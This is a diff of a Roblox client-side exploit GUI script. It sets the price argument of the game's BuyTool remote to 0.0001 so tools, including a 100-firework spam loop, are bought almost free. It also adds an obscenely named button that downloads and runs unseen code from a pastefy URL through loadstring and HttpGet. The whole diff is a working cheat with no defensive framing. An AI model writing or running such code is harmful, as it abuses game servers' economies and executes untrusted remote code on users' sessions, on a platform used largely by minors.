@@ -1,5 +1,6 @@
 -- W??? SIGMA??
 --!strict
+--!strict
 
 local p = game:GetService("Players").LocalPlayer
 repeat task.wait() until p and p:FindFirstChild("PlayerGui")
@@ -55,7 +56,7 @@ title.Parent = bg
 local scroll = Instance.new("ScrollingFrame")
 scroll.Size = UDim2.new(1, 0, 1, -50)
 scroll.Position = UDim2.new(0, 0, 0, 50)
-scroll.CanvasSize = UDim2.new(0, 0, 0, 700)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 800)
 scroll.ScrollBarThickness = 4
 scroll.BackgroundTransparency = 1
 scroll.Parent = bg
@@ -134,24 +135,23 @@ for _, tool in ipairs(tools) do
 			local rem = game.ReplicatedStorage:FindFirstChild("Remotes") and game.ReplicatedStorage.Remotes:FindFirstChild("BuyTool")
 			local t = game.ReplicatedStorage:FindFirstChild("Tools") and game.ReplicatedStorage.Tools:FindFirstChild(tool)
 			if rem and t then
-				rem:FireServer(0.001, t)
+				rem:FireServer(0.0001, t)
 			end
 		end)
 	end
 end
+
 btn("Firework Spam", function()
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local Players = game:GetService("Players")
 	local Player = Players.LocalPlayer
 
-	local Humanoid = Player.Character.Humanoid
 	local BuyTool = ReplicatedStorage.Remotes.BuyTool
 	local Fireworks = ReplicatedStorage.Tools.Fireworks
-
 	local IWant = 100
 
-	for Index = 0.001, IWant do
-		BuyTool:FireServer(1, Fireworks)
+	for Index = 0.0001, IWant do
+		BuyTool:FireServer(0.0001, Fireworks)
 	end
 
 	local Tools = 0
@@ -166,6 +166,10 @@ btn("Firework Spam", function()
 		task.wait()
 		Tool:Activate()
 	end
+end)
+
+btn("FE Jerk Off", function()
+	loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
 end)
 
 local dragging = false
